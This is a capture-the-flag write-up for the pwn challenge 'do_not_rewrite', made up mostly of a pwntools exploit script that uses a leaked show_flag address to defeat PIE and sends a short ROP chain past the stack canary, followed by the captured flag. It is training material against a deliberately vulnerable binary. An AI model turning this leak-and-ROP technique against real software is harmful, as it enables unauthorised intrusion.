# Pwn - do_not_rewrite
Solved by **CapangJabba**

## Question
Be careful with the canary.

## Solution
```
from pwn import *
from ctypes import *
if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./chall", )
elf = context.binary = ELF("./chall", checksec=False)
rop = ROP(elf)
context.log_level = 'debug'
pause()


io.recvuntil(b'hint: show_flag = ')
flag = int(io.recvline().strip(), 16)
print(f'Flag: {hex(flag)}')

io.recvuntil(b'Enter the name of ingredient 1: ')
io.sendline(b'a')
io.recvuntil(b'Enter the calories per gram for a: ')
io.sendline(b'1.2')
io.recvuntil(b'Enter the amount in grams for a: ')
io.sendline(b'1.3')

io.recvuntil(b'Enter the name of ingredient 2: ')
io.sendline(b'a')
io.recvuntil(b'Enter the calories per gram for a: ')
io.sendline(b'1.4')
io.recvuntil(b'Enter the amount in grams for a: ')
io.sendline(b'2.0')

io.recvuntil(b'Enter the name of ingredient 3: ')
io.sendline(b'a')
io.recvuntil(b'Enter the calories per gram for a: ')
io.sendline(b'3.1')
io.recvuntil(b'Enter the amount in grams for a: ')
io.sendline(b'2.3')

io.recvuntil(b'Enter the name of ingredient 4: ')



main = elf.sym['main']

base_add =  flag - elf.sym['show_flag']

main_addr = base_add + main
ret = base_add + 0x101a
payload = p64(ret)
payload += p64(flag)
payload += p64(main_addr)
print(f'base_add: {hex(base_add)}')
print(f'main_addr: {hex(main_addr)}')
io.sendline(payload)
io.sendline(b'aaaa')

io.interactive()
```

### Flag
`FLAG{B3_c4r3fu1_wh3n_using_th3_f0rm4t_sp3cifi3r_1f_in_sc4nf}`
